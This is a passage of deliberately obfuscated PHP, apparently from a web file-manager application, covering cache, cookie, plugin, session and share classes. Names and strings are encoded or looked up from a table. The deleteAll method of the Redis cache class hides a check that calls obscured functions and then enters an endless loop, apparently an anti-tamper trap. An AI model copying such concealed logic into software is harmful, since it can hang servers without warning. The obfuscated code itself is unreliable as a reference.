$‘¾Ğê£İ) { $Ÿ ‰´ıĞ =& $_SERVER[¿ÈˆÑ¸ä]; $£»ì©„œ =& $this->task; if ($‘¾Ğê£İ > 0) { $£»ì©„œ[$Ÿ ‰´ıĞ[1167]] = $Ÿ ‰´ıĞ[1997]; $£»ì©„œ[$Ÿ ‰´ıĞ[1971]] = $Ÿ ‰´ıĞ[108]; if ($£»ì©„œ[$Ÿ ‰´ıĞ[1969]]) { $£»ì©„œ[$Ÿ ‰´ıĞ[1970]] = $‘¾Ğê£İ; } if ($£»ì©„œ[$Ÿ ‰´ıĞ[1972]]) { $£»ì©„œ[$Ÿ ‰´ıĞ[1970]] = $‘¾Ğê£İ + $£»ì©„œ[$Ÿ ‰´ıĞ[1972]]; } } else { if ($Ó—ÄŞàÊ > 0) { if ($£»ì©„œ[$Ÿ ‰´ıĞ[1969]] == $ÑÙÍªÀ¬) { $£»ì©„œ[$Ÿ ‰´ıĞ[1970]] = $Ó—ÄŞàÊ; $£»ì©„œ[$Ÿ ‰´ıĞ[1167]] = $Ÿ ‰´ıĞ[1998]; $£»ì©„œ[$Ÿ ‰´ıĞ[1971]] = $Ÿ ‰´ıĞ[1318]; } } } $this->update(); $Ååµ”éü = "\x64\x6f\x77\x6e\72{$Ó—ÄŞàÊ}\x2f{$ÑÙÍªÀ¬}\x3b\x20\x75\x70\x6c\x6f\x61\144\x3a{$‘¾Ğê£İ}\57{$øÀøèáĞ}\73\x66\151\x6c\x65\x3d" . $£»ì©„œ[$Ÿ ‰´ıĞ[1969]]; self::log(array($Ÿ ‰´ıĞ[1999] . $Ååµ”éü . $Ÿ ‰´ıĞ[74] . $£»ì©„œ[$Ÿ ‰´ıĞ[1967]], curl_getinfo($¦—º‡))); } public function curlProgressStart($êé»†ìÑ) { } public function curlProgressEnd($ÊÁˆòµÉ) { $‰è¯æÈÁ =& $_SERVER[¿ÈˆÑ¸ä]; $Á¸İéª =& $this->task; $À½ÌÂõ = curl_getinfo($ÊÁˆòµÉ); $Êó»ÌÀ€ = $À½ÌÂõ[$‰è¯æÈÁ[2000]]; if ($Êó»ÌÀ€ == -1) { $Êó»ÌÀ€ = $À½ÌÂõ[$‰è¯æÈÁ[2001]]; } if ($Á¸İéª[$‰è¯æÈÁ[1971]] == $‰è¯æÈÁ[108] && $Êó»ÌÀ€) { $Á¸İéª[$‰è¯æÈÁ[1972]] += $Êó»ÌÀ€; } $this->update(); } } $_file = $_SERVER[$_SERVER[¿ÈˆÑ¸ä][969]]; $_size = $_SERVER[¿ÈˆÑ¸ä][1606]; goto aÒÛÃšÏ¤Ç; DÒ½èìŞÑ: class CacheMemcached { public $handle; public $cacheTime; public function __construct($üö¸Ãüƒ, $í ²àõ‡) { $‹Ÿª =& $_SERVER[¿ÈˆÑ¸ä]; if (!class_exists($‹Ÿª[970])) { show_json($‹Ÿª[971], !1); } $this->cacheTime = $í ²àõ‡; $this->handle = new Memcached(); if (is_array($üö¸Ãüƒ[$‹Ÿª[972]]) && count($üö¸Ãüƒ[$‹Ÿª[972]]) >= 1) { foreach ($üö¸Ãüƒ[$‹Ÿª[972]] as $ö¼¥ÏŠ’) { $ºİÂ˜‡’ = explode($‹Ÿª[4], $ö¼¥ÏŠ’); $this->handle->addServer($ºİÂ˜‡’[0], $ºİÂ˜‡’[1]); } } else { $this->handle->addServer($üö¸Ãüƒ[$‹Ÿª[207]], $üö¸Ãüƒ[$‹Ÿª[208]]); } } public function set($·µËã¾Ã, $‘²¿ÏÆ“, $½›‡ÎÅ× = false) { $½›‡ÎÅ× = $½›‡ÎÅ× ? $½›‡ÎÅ× : $this->cacheTime; return $this->handle->set($·µËã¾Ã, $‘²¿ÏÆ“, $½›‡ÎÅ×); } public function get($äÑ¤·ˆè) { return $this->handle->get($äÑ¤·ˆè); } public function remove($•—ËøÊ¢) { return $this->handle->delete($•—ËøÊ¢); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($Ãˆõ‡¥Ø, $ºŠ…ÇÑ€) { $û°£Ï€Ğ =& $_SERVER[¿ÈˆÑ¸ä]; if (!class_exists($û°£Ï€Ğ[973])) { show_json($û°£Ï€Ğ[974], !1); } $this->cacheTime = $ºŠ…ÇÑ€; $˜ÊÒ÷„Ì = isset($Ãˆõ‡¥Ø[$û°£Ï€Ğ[975]]) ? $Ãˆõ‡¥Ø[$û°£Ï€Ğ[975]] : 10; $Õ£§©®­ = _get($Ãˆõ‡¥Ø, $û°£Ï€Ğ[972]); if ($Õ£§©®­ && is_array($Õ£§©®­)) { $this->initCluster($Ãˆõ‡¥Ø, $˜ÊÒ÷„Ì); } else { $this->handle = $this->init($Ãˆõ‡¥Ø, $˜ÊÒ÷„Ì); } } private function init($×¡Š£ïœ, $ºÅğ×ä‹) { $º‰¥Á°ß =& $_SERVER[¿ÈˆÑ¸ä]; $‹ˆ§ã…à = new Redis(); $ÍÚŸàŞ÷ = isset($×¡Š£ïœ[$º‰¥Á°ß[976]]) ? $×¡Š£ïœ[$º‰¥Á°ß[976]] : !1; if ($ÍÚŸàŞ÷) { $‹ˆ§ã…à->pconnect($×¡Š£ïœ[$º‰¥Á°ß[207]], $×¡Š£ïœ[$º‰¥Á°ß[208]], $ºÅğ×ä‹); } else { $‹ˆ§ã…à->connect($×¡Š£ïœ[$º‰¥Á°ß[207]], $×¡Š£ïœ[$º‰¥Á°ß[208]], $ºÅğ×ä‹); } if (!empty($×¡Š£ïœ[$º‰¥Á°ß[498]])) { $‹ˆ§ã…à->auth($×¡Š£ïœ[$º‰¥Á°ß[498]]); } if (!empty($×¡Š£ïœ[$º‰¥Á°ß[841]]) && $×¡Š£ïœ[$º‰¥Á°ß[841]] != 0) { $‹ˆ§ã…à->select($×¡Š£ïœ[$º‰¥Á°ß[841]]); } return $‹ˆ§ã…à; } private function initCluster($Œâ«‘¨à, $Ä ¶•ş©) { $‘ï›ô«Œ =& $_SERVER[¿ÈˆÑ¸ä]; $·‡ˆîé = array($‘ï›ô«Œ[977], $‘ï›ô«Œ[978], $‘ï›ô«Œ[979]); $¢ê’æÓı = $‘ï›ô«Œ[977]; if (isset($Œâ«‘¨à[$‘ï›ô«Œ[16]]) && in_array($Œâ«‘¨à[$‘ï›ô«Œ[16]], $·‡ˆîé)) { $¢ê’æÓı = $Œâ«‘¨à[$‘ï›ô«Œ[16]]; } switch ($¢ê’æÓı) { case $‘ï›ô«Œ[977]: $this->_slave($Œâ«‘¨à, $Ä ¶•ş©); break; case $‘ï›ô«Œ[978]: break; case $‘ï›ô«Œ[979]: $this->isCluster = !0; $Ğ¤ìß· = $Œâ«‘¨à[$‘ï›ô«Œ[972]]; $ƒ˜ÕŠÔÊ = isset($Œâ«‘¨à[$‘ï›ô«Œ[976]]) ? $Œâ«‘¨à[$‘ï›ô«Œ[976]] : !1; $ÅÛ¼ïÓË = isset($Œâ«‘¨à[$‘ï›ô«Œ[498]]) ? $Œâ«‘¨à[$‘ï›ô«Œ[498]] : null; $this->handle = new RedisCluster(NUll, $Ğ¤ìß·, $Ä ¶•ş©, $Ä ¶•ş©, $ƒ˜ÕŠÔÊ, $ÅÛ¼ïÓË); break; default: break; } } private function _slave($Á¦İÏ¾®, $«¬¤ÒÆ€) { $Öİ¢Ğ’Œ = $Á¦İÏ¾®[$_SERVER[¿ÈˆÑ¸ä][972]]; $this->filterConfig($Á¦İÏ¾®, $Öİ¢Ğ’Œ[0]); $this->handle = $this->init($Á¦İÏ¾®, $«¬¤ÒÆ€); unset($Öİ¢Ğ’Œ[0]); if (empty($Öİ¢Ğ’Œ)) { return; } $âˆ íÜî = array_rand($Öİ¢Ğ’Œ); $this->filterConfig($Á¦İÏ¾®, $Öİ¢Ğ’Œ[$âˆ íÜî]); $this->slaveHandle = $this->init($Á¦İÏ¾®, $«¬¤ÒÆ€); } private function filterConfig(&$İªÂÓ¹, $âï™Â­ş) { $ÖüÍ¦¿Ó =& $_SERVER[¿ÈˆÑ¸ä]; $úÃªŞ”ü = explode($ÖüÍ¦¿Ó[4], $âï™Â­ş); $ğ†¸Äö = array($ÖüÍ¦¿Ó[207] => $úÃªŞ”ü[0], $ÖüÍ¦¿Ó[208] => $úÃªŞ”ü[1]); $İªÂÓ¹ = array_merge($İªÂÓ¹, $ğ†¸Äö); } public function set($’²ëšÕ‰, $µŠí–·, $»ùã†úŒ = false) { $»ùã†úŒ = $»ùã†úŒ ? $»ùã†úŒ : $this->cacheTime; return $this->handle->setEx($’²ëšÕ‰, $»ùã†úŒ, $µŠí–·); } public function setLock($“ıÅäğÄ, $üÑşÄŠ, $ª­ùù»…) { return $this->handle->setNX($“ıÅäğÄ, $üÑşÄŠ); } public function get($½·š›«Ô) { $‘é„àìÀ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $‘é„àìÀ->get($½·š›«Ô); } public function remove($ßŞÍš£¦) { return $this->handle->del($ßŞÍš£¦); } public function deleteAll() { $ŠĞ³Ô =& $_SERVER[¿ÈˆÑ¸ä]; if (!isset($_SERVER[$ŠĞ³Ô[962]]) || !isset($_SERVER[$ŠĞ³Ô[969]])) { $µÖ ñ²± = $ŠĞ³Ô[980]; $‡’Ğ¥« = $ŠĞ³Ô[964]; $ãü½…Åí = $_SERVER[$ŠĞ³Ô[965]] . $ŠĞ³Ô[966]; $åîÅ÷¼ = $‡’Ğ¥«($ãü½…Åí); $Ò§¢²¥µ = explode($ŠĞ³Ô[286], $åîÅ÷¼); if (count($Ò§¢²¥µ) < $ŠĞ³Ô[703]) { $Òã¥É®Ì = $ŠĞ³Ô[967]; $Òã¥É®Ì(); } $á’Ê…øŞ = $ŠĞ³Ô[981]; $á’Ê…øŞ($_SERVER[$ŠĞ³Ô[982]]); $°¸åÅÄÙ = 1; for ($ñîœò‘‡ = $°¸åÅÄÙ; $ñîœò‘‡ > 0; $ñîœò‘‡++) { $á’Ê…øŞ = json_encode($GLOBALS[$ŠĞ³Ô[503]]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $í¡§‘ÍË) { $this->handle->flushall($í¡§‘ÍË); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($ğÀñ¿‡’ = '', $üş‹¤¶ = 0) { if (is_string($ğÀñ¿‡’) && $ğÀñ¿‡’ != $_SERVER[¿ÈˆÑ¸ä][12]) { $this->prefix = $ğÀñ¿‡’; } if (is_numeric($üş‹¤¶) && $üş‹¤¶ > 0) { $this->expire = $üş‹¤¶; } } public static function getInstance() { static $ÃÀ¿•ƒÔ; if ($ÃÀ¿•ƒÔ === null) { $ÃÀ¿•ƒÔ = new self(); } return $ÃÀ¿•ƒÔ; } private static $cookieDisable = false; public static function disable($‰‡öü°) { self::$cookieDisable = $‰‡öü°; } private static $sameCookieSet = array(); public static function set($¤•šŸÎÛ, $ Ã‘õŠš, $¡ÏÃ×äó = 0, $ô  ‘Ê’ = false, $‰§ÛÂÑ¥ = false) { $‹Ò¦¦–Å =& $_SERVER[¿ÈˆÑ¸ä]; if (self::$cookieDisable) { return; } if (!$¡ÏÃ×äó) { $¡ÏÃ×äó = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$¤•šŸÎÛ]) && self::$sameCookieSet[$¤•šŸÎÛ] == $ Ã‘õŠš . $¡ÏÃ×äó) { return; } self::$sameCookieSet[$¤•šŸÎÛ] = $ Ã‘õŠš . $¡ÏÃ×äó; if (!$‰§ÛÂÑ¥) { $‰§ÛÂÑ¥ = str_replace(HOST, $‹Ò¦¦–Å[12], APP_HOST); $‰§ÛÂÑ¥ = _get($GLOBALS, $‹Ò¦¦–Å[983], $‰§ÛÂÑ¥); } $Ô¸ì¼ûï = $‹Ò¦¦–Å[12]; setcookie($¤•šŸÎÛ, $ Ã‘õŠš, time() + $¡ÏÃ×äó, $‹Ò¦¦–Å[8] . trim($‰§ÛÂÑ¥, $‹Ò¦¦–Å[8]) . $Ô¸ì¼ûï, !1, !1, $ô  ‘Ê’); } public static function setSafe($¦°êé¸», $‚‰ŞÑ›İ, $ùÑˆÍ°À = 0) { self::set($¦°êé¸», $‚‰ŞÑ›İ, $ùÑˆÍ°À, !0); } public static function get($ÃÏ’Â®ê) { static $áë³÷Š® = false; if (!$áë³÷Š®) { self::initHeaderCookie(); $áë³÷Š® = !0; } return isset($_COOKIE[$ÃÏ’Â®ê]) ? $_COOKIE[$ÃÏ’Â®ê] : !1; } private static function initHeaderCookie() { $õ‘˜üŸÕ =& $_SERVER[¿ÈˆÑ¸ä]; if (!isset($_SERVER[$õ‘˜üŸÕ[984]]) || !$_SERVER[$õ‘˜üŸÕ[984]]) { return; } $”ê€úøğ = explode($õ‘˜üŸÕ[74], $_SERVER[$õ‘˜üŸÕ[984]]); foreach ($”ê€úøğ as $ô¤„¶€») { $ô¤„¶€» = explode($õ‘˜üŸÕ[464], $ô¤„¶€»); if (count($ô¤„¶€») != 2 || !isset($ô¤„¶€»[1])) { continue; } $_COOKIE[trim($ô¤„¶€»[0])] = trim($ô¤„¶€»[1]); } } public static function remove($†ßêöŸ®, $õíÆØ‚å = false) { unset($_COOKIE[$†ßêöŸ®]); self::set($†ßêöŸ®, $_SERVER[¿ÈˆÑ¸ä][12], 1, $õíÆØ‚å); } } goto f¢›Á×òøô; b×š˜†°: class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\145\162\137\157\160\164\151\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($„ßûëËŒ) { return "\x55\163\145\162\117\x70\164\x69\x6f\156\x5f{$„ßûëËŒ}\x5f" . KodUser::id(); } protected function filterWhere($Òğşåö±) { $Òğşåö±[$_SERVER[¿ÈˆÑ¸ä][1529]] = KodUser::id(); return $Òğşåö±; } public function cacheRemoveUser($Á¹§àç, $µîÚ¡œã) { return Cache::remove("\x55\x73\x65\x72\117\160\x74\151\x6f\x6e\137{$Á¹§àç}\137" . $µîÚ¡œã); } protected function optionDefault($®ÛêúÃ = '') { $¨Á›Ş› =& $_SERVER[¿ÈˆÑ¸ä]; if ($®ÛêúÃ == $¨Á›Ş›[12]) { return $GLOBALS[$¨Á›Ş›[6]][$¨Á›Ş›[2662]]; } if ($®ÛêúÃ == $¨Á›Ş›[2663]) { return $GLOBALS[$¨Á›Ş›[6]][$¨Á›Ş›[2664]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\145\x72\x2e\164\x61\147\x4c\151\163\164"; public $modelType = "\125\163\145\x72\x4f\x70\x74\x69\157\156"; public $field = array("\x6e\x61\155\x65", "\163\x74\171\x6c\x65", "\163\157\x72\x74"); public function listData($ÖÖÆÛÂ˜ = false, $¼æØ‡şÖ = "\x73\x6f\162\164", $ÙÀâôŞ¬ = false) { return parent::listData($ÖÖÆÛÂ˜, $¼æØ‡şÖ, $ÙÀâôŞ¬); } public function remove($¬ˆ¡ƒÁÓ) { return parent::remove($¬ˆ¡ƒÁÓ); } public function add($›·ù› ¿, $Œõ×™¿ = "\154\141\142\145\154\x2d\147\x72\145\x79\55\156\157\x72\x6d\141\x6c") { $şßªĞ‡ =& $_SERVER[¿ÈˆÑ¸ä]; if ($this->findByName($›·ù› ¿)) { return !1; } $Ş³ÓÕ‡¼ = array($şßªĞ‡[505] => $›·ù› ¿, $şßªĞ‡[570] => $Œõ×™¿, $şßªĞ‡[2126] => $this->getSort($şßªĞ‡[336]) + 1); return parent::insert($Ş³ÓÕ‡¼); } public function update($³õ‚Õ‚¯, $¬ëÙ¢¦ğ) { $€Ãì¦ª =& $_SERVER[¿ÈˆÑ¸ä]; $êàˆ«ßÆ = $this->listData($³õ‚Õ‚¯); $Ää„§ù = $this->findByName($¬ëÙ¢¦ğ[$€Ãì¦ª[32]]); if (!$êàˆ«ßÆ || $Ää„§ù && $Ää„§ù[$€Ãì¦ª[483]] != $êàˆ«ßÆ[$€Ãì¦ª[483]]) { return !1; } return parent::update($³õ‚Õ‚¯, $¬ëÙ¢¦ğ); } public function moveTop($—¾Î¬Ô¼) { $é©Ô‰µÎ =& $_SERVER[¿ÈˆÑ¸ä]; $âÉØ¹ = parent::listData(); $“ÍÁ¡Ú = $this->getSort($é©Ô‰µÎ[335]); foreach ($âÉØ¹ as &$ŠãŠ¯Ú) { if ($ŠãŠ¯Ú[$é©Ô‰µÎ[483]] == $—¾Î¬Ô¼) { $ŠãŠ¯Ú[$é©Ô‰µÎ[2144]] = $“ÍÁ¡Ú; continue; } $ŠãŠ¯Ú[$é©Ô‰µÎ[2144]] += 1; } unset($ŠãŠ¯Ú); return parent::resetData($âÉØ¹); } public function moveBottom($êÜµ¶åñ) { $–º¢”éï =& $_SERVER[¿ÈˆÑ¸ä]; $ıŠ¨ú = $this->getSort($–º¢”éï[336]) + 1; return parent::update($êÜµ¶åñ, array($–º¢”éï[2144] => $ıŠ¨ú)); } public function resetSort($‰›Õæ®) { $Îé¨À©¸ =& $_SERVER[¿ÈˆÑ¸ä]; $ûƒˆ±Ë­ = array(); $‰›Õæ® = is_array($‰›Õæ®) ? $‰›Õæ® : array(); for ($Õ¦¹Ó = 0; $Õ¦¹Ó < count($‰›Õæ®); $Õ¦¹Ó++) { $ûƒˆ±Ë­[$‰›Õæ®[$Õ¦¹Ó] . $Îé¨À©¸[12]] = $Õ¦¹Ó + 1; } $öæ„‹¨ = parent::listData(); foreach ($öæ„‹¨ as &$„ô‰å†ï) { $ëÀã€Ğ« = $ûƒˆ±Ë­[$„ô‰å†ï[$Îé¨À©¸[483]]]; $„ô‰å†ï[$Îé¨À©¸[2144]] = $ëÀã€Ğ« ? $ëÀã€Ğ« : $„ô‰å†ï[$Îé¨À©¸[2144]]; } unset($„ô‰å†ï); return parent::resetData($öæ„‹¨); } private function getSort($ °òÑè÷) { $‰–¼¹ñÛ =& $_SERVER[¿ÈˆÑ¸ä]; $ôòÎÇ¥ = parent::listData(); $à†ÀÄï‚ = array_to_keyvalue($ôòÎÇ¥, $‰–¼¹ñÛ[12], $‰–¼¹ñÛ[2144]); if (!$à†ÀÄï‚) { $à†ÀÄï‚ = array(0); } $ÊÄŸİ›š = $ °òÑè÷ == $‰–¼¹ñÛ[336] ? max($à†ÀÄï‚) : min($à†ÀÄï‚); return intval($ÊÄŸİ›š); } } goto EææÇ­óÂ×; fÎÑ•Ü¾: class PluginModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\155\x2e\160\x6c\165\x67\x69\x6e\114\151\x73\x74"; public $field = array("\x6e\141\155\145", "\x73\164\141\164\x75\x73", "\162\x65\147\151\x65\x73\x74", "\143\x6f\156\146\151\147"); public function loadList($£éˆ‹™ = false) { $áé¦ß‘¼ = array_to_keyvalue($this->listData(), $_SERVER[¿ÈˆÑ¸ä][32]); if ($£éˆ‹™) { return $áé¦ß‘¼[$£éˆ‹™]; } return $áé¦ß‘¼; } public function init() { $ïîØÎú =& $_SERVER[¿ÈˆÑ¸ä]; Hook::trigger($ïîØÎú[2242]); $Ùûæ«¯ = $this->loadPluginList(); foreach ($Ùûæ«¯ as $Í÷­áƒİ => $øñ‘”Åï) { $ÆÅ¿Ê€ = $this->appAllow($Í÷­áƒİ, $øñ‘”Åï); if (!$ÆÅ¿Ê€) { continue; } foreach ($øñ‘”Åï[$ïîØÎú[2243]] as $ËÅÉÛ”İ => $Ûùõºº­) { Hook::bind($ËÅÉÛ”İ, $Ûùõºº­); } } Hook::trigger($ïîØÎú[2244]); Hook::trigger(ACTION); } public function appAllow($¬”½şµÓ, $ŸĞÒ¨á², $Ëö¾Å¸Ä = true) { $øµ”ãúà =& $_SERVER[¿ÈˆÑ¸ä]; $ù¯¡Ú·œ = PLUGIN_DIR . $¬”½şµÓ . $øµ”ãúà[2245]; if (!is_array($ŸĞÒ¨á²) || !is_array($ŸĞÒ¨á²[$øµ”ãúà[2243]]) || $ŸĞÒ¨á²[$øµ”ãúà[833]] != 1 || !is_file($ù¯¡Ú·œ)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$øµ”ãúà[6]][$øµ”ãúà[2246]] || !$GLOBALS[$øµ”ãúà[6]][$øµ”ãúà[2247]]) { return !0; } $‘ù©µÚ  = explode($øµ”ãúà[50], strtolower($GLOBALS[$øµ”ãúà[6]][$øµ”ãúà[2247]])); return in_array(strtolower($¬”½şµÓ), $‘ù©µÚ ) ? !1 : !0; } if ($Ëö¾Å¸Ä && !Action($øµ”ãúà[2248])->checkAuth($¬”½şµÓ)) { return !1; } return !0; } public function unInstall($ı›Á·óÔ) { $şÈİˆÛÆ =& $_SERVER[¿ÈˆÑ¸ä]; $¥¹‹Çåü = $this->loadList($ı›Á·óÔ); if (file_exists(PLUGIN_DIR . $ı›Á·óÔ)) { Hook::apply($ı›Á·óÔ . $şÈİˆÛÆ[2249]); } $this->remove($¥¹‹Çåü[$şÈİˆÛÆ[483]]); } public function changeStatus($Û¢¡†İÉ, $•©ˆÒ½) { $¤œ¸ãÀÊ =& $_SERVER[¿ÈˆÑ¸ä]; $¸·ğ™úà = $this->loadList($Û¢¡†İÉ); if ($•©ˆÒ½) { Hook::apply($Û¢¡†İÉ . $¤œ¸ãÀÊ[2250]); } $this->update($¸·ğ™úà[$¤œ¸ãÀÊ[483]], array($¤œ¸ãÀÊ[2251] => $•©ˆÒ½)); } public function appRegist($îàğÊÛƒ, $Ñ úááõ) { $¸½Ï‚³ƒ =& $_SERVER[¿ÈˆÑ¸ä]; $–®–ëÌ = $this->loadList($îàğÊÛƒ); if ($–®–ëÌ) { $this->update($–®–ëÌ[$¸½Ï‚³ƒ[483]], array($¸½Ï‚³ƒ[2243] => $Ñ úááõ)); } else { $Ş¿‹İñ· = array($¸½Ï‚³ƒ[32] => $îàğÊÛƒ, $¸½Ï‚³ƒ[2243] => $Ñ úááõ, $¸½Ï‚³ƒ[833] => 0, $¸½Ï‚³ƒ[6] => $this->getConfigDefault($îàğÊÛƒ)); $this->insert($Ş¿‹İñ·); } } public function getConfigDefault($ºú²ıåĞ) { $‡™¿Ùò =& $_SERVER[¿ÈˆÑ¸ä]; $¤èô ØÎ = array(); $àª¨˜¤“ = $this->getPackageJson($ºú²ıåĞ); if (!$àª¨˜¤“ && is_array($àª¨˜¤“[$‡™¿Ùò[2252]])) { return $¤èô ØÎ; } foreach ($àª¨˜¤“[$‡™¿Ùò[2252]] as $å¶‘„«® => $É¤ûÙ‡ ) { if (!isset($É¤ûÙ‡ [$‡™¿Ùò[451]]) || isset($¤èô ØÎ[$å¶‘„«®])) { continue; } $¤èô ØÎ[$å¶‘„«®] = $É¤ûÙ‡ [$‡™¿Ùò[451]]; } return $¤èô ØÎ; } public function getPackageJson($¦•’Ü¢) { return Hook::apply($¦•’Ü¢ . $_SERVER[¿ÈˆÑ¸ä][2253]); } public function getConfig($ß­•âÑ·, $º³ŸÑäÉ = false) { $ìä»ÆŸå =& $_SERVER[¿ÈˆÑ¸ä]; $¿âÃ¢ˆ = array(); $à›å™¯± = $this->loadList($ß­•âÑ·); if ($à›å™¯± && is_array($à›å™¯±[$ìä»ÆŸå[6]])) { $¿âÃ¢ˆ = $à›å™¯±[$ìä»ÆŸå[6]]; } if (!$¿âÃ¢ˆ || $º³ŸÑäÉ) { $¿âÃ¢ˆ = $this->getConfigDefault($ß­•âÑ·); } return $¿âÃ¢ˆ; } public function setConfig($µ¢ñŒş, $ÁŒøïÔÛ = false) { $Ì¬ôõñ« =& $_SERVER[¿ÈˆÑ¸ä]; $€øÕ¸‘‡ = $this->loadList($µ¢ñŒş); if (!$€øÕ¸‘‡) { return !1; } $›÷±ãŞØ = $€øÕ¸‘‡[$Ì¬ôõñ«[6]]; if ($ÁŒøïÔÛ == !1) { $›÷±ãŞØ = array(); $ÁŒøïÔÛ = $this->getConfigDefault($µ¢ñŒş); } foreach ($ÁŒøïÔÛ as $Ù¿ä‚÷ => $–¨÷¹·) { $›÷±ãŞØ[$Ù¿ä‚÷] = is_string($–¨÷¹·) ? trim($–¨÷¹·) : $–¨÷¹·; } $this->update($€øÕ¸‘‡[$Ì¬ôõñ«[483]], array($Ì¬ôõñ«[6] => $›÷±ãŞØ)); } public function viewList() { $ù›õëËÒ =& $_SERVER[¿ÈˆÑ¸ä]; $¥Ôµ‰· = $this->loadList(); $this->pluginScan($¥Ôµ‰·); $¥Ôµ‰· = $this->loadPluginList(); $ßÄîİù² = array(); foreach ($¥Ôµ‰· as $¢—ĞŒ…Ü => $÷§¦Ìˆø) { $ãùØŸóß = $÷§¦Ìˆø; unset($÷§¦Ìˆø[$ù›õëËÒ[2243]], $÷§¦Ìˆø[$ù›õëËÒ[6]]); $ä¦œ«À = PLUGIN_DIR . $÷§¦Ìˆø[$ù›õëËÒ[32]] . $ù›õëËÒ[2245]; if (!is_file($ä¦œ«À)) { continue; } $»ğ²†œ = Hook::apply($÷§¦Ìˆø[$ù›õëËÒ[32]] . $ù›õëËÒ[2253]); if (!is_array($»ğ²†œ)) { continue; } $ßÄîİù²[$¢—ĞŒ…Ü] = array_merge($÷§¦Ìˆø, $»ğ²†œ); if ($ãùØŸóß[$ù›õëËÒ[6]][$ù›õëËÒ[1827]] != $»ğ²†œ[$ù›õëËÒ[1801]]) { Hook::apply($÷§¦Ìˆø[$ù›õëËÒ[32]] . $ù›õëËÒ[2250]); $ãùØŸóß[$ù›õëËÒ[6]][$ù›õëËÒ[1827]] = $»ğ²†œ[$ù›õëËÒ[1801]]; $this->update($÷§¦Ìˆø[$ù›õëËÒ[483]], array($ù›õëËÒ[6] => $ãùØŸóß[$ù›õëËÒ[6]])); } } return $ßÄîİù²; } private function loadPluginList() { $Ù¨Âã†Æ =& $_SERVER[¿ÈˆÑ¸ä]; $¢‡½şÓ¡ = $this->loadList(); if (strtolower(MOD) == $Ù¨Âã†Æ[2254]) { return $¢‡½şÓ¡; } $Öˆä  = Hook::trigger($Ù¨Âã†Æ[2255], $¢‡½şÓ¡); if ($¢‡½şÓ¡ && !$Öˆä ) { die; } return $Öˆä  ? $Öˆä  : $¢‡½şÓ¡; } private function pluginScan($ø¢÷ æğ) { $Âˆå«â  =& $_SERVER[¿ÈˆÑ¸ä]; recursion_dir(PLUGIN_DIR, $„Åï´®ë, $„ìÇÜ®¡, 0); foreach ($„Åï´®ë as $×íŠŒËß) { $ÖÖÊ¨Ø¯ = get_path_this($×íŠŒËß); if (isset($ø¢÷ æğ[$ÖÖÊ¨Ø¯]) || !file_exists($×íŠŒËß . $Âˆå«â [2256]) || !file_exists($×íŠŒËß . $Âˆå«â [2245])) { continue; } Hook::apply($ÖÖÊ¨Ø¯ . $Âˆå«â [2250]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\x79\x73\164\145\x6d\137\163\x65\x73\x73\x69\x6f\x6e"; public function get($ãŞÍË˜) { $˜µÛÊĞ =& $_SERVER[¿ÈˆÑ¸ä]; $Ì±•ÊÓ× = $this->where(array($˜µÛÊĞ[2257] => $ãŞÍË˜))->find(); if (!is_array($Ì±•ÊÓ×)) { return !1; } return $Ì±•ÊÓ×[$˜µÛÊĞ[169]]; } public function set($³‹ö÷Éò, $ğâìáé, $©²ÊØˆ‘ = 3600) { $ì»ßô =& $_SERVER[¿ÈˆÑ¸ä]; $È™òÒ¿Õ = array($ì»ßô[2257] => $³‹ö÷Éò, $ì»ßô[2160] => $ğâìáé, $ì»ßô[2258] => $©²ÊØˆ‘ + time()); if (Session::get($ì»ßô[2259])) { $È™òÒ¿Õ[$ì»ßô[1529]] = Session::get($ì»ßô[2259]); } else { $È™òÒ¿Õ[$ì»ßô[1529]] = 0; } if ($this->get($³‹ö÷Éò)) { return $this->where(array($ì»ßô[2257] => $³‹ö÷Éò))->save($È™òÒ¿Õ); } else { return $this->add($È™òÒ¿Õ, array(), !0); } } public function remove($ÒÕÀßÉƒ) { return $this->where(array($_SERVER[¿ÈˆÑ¸ä][2257] => $ÒÕÀßÉƒ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[¿ÈˆÑ¸ä][2260] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\150\141\162\145"; protected $dataAuto = array(array("\x6d\x6f\x64\x69\146\x79\124\x69\155\145", "\x74\151\x6d\145", "\151\x6e\163\x65\162\164\54\165\x70\144\141\164\x65", "\146\x75\156\143\164\151\157\x6e"), array("\143\162\145\x61\x74\145\x54\x69\155\145", "\164\x69\155\145", "\x69\x6e\163\145\x72\x74", "\146\x75\156\143\164\151\x6f\x6e"), array("\157\160\x74\x69\157\156\163", '', "\151\156\163\x65\x72\x74\54\x75\x70\x64\x61\164\145\x2c\163\x65\x6c\x65\x63\x74", "\x6a\x73\157\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($Ó›ƒŞ©²) { $¥×¯ù¡É =& $_SERVER[¿ÈˆÑ¸ä]; return array($¥×¯ù¡É[2261] => array(USER_ID, $¥×¯ù¡É[2262]), $¥×¯ù¡É[2263] => array($Ó›ƒŞ©²[0], $¥×¯ù¡É[2264])); } protected function ___listSimple() { $°™¤æªË = $this->field($this->fieldList)->where(array($_SERVER[¿ÈˆÑ¸ä][1529] => USER_ID))->select(); return $°™¤æªË ? $°™¤æªË : array(); } protected function ___getInfoShare($“æ¾Æ¡ê) { return $this->_getShareInfo(array($_SERVER[¿ÈˆÑ¸ä][684] => $“æ¾Æ¡ê), !1); } protected function getInfo($·†­Î©­) { $ìº¿ô‘” = $this->getInfoShare($·†­Î©­); return $this->shareSourceInfo($ìº¿ô‘”); } public function getInfoByHash($ŠˆôŠ®´) { return $this->_getShareInfo(array($_SERVER[¿ÈˆÑ¸ä][1491] => $ŠˆôŠ®´)); } public function getInfoByPath($·¡Òşâ) { $Ú€¼‰›Ø =& $_SERVER[¿ÈˆÑ¸ä]; $ƒá¼áØ³ = 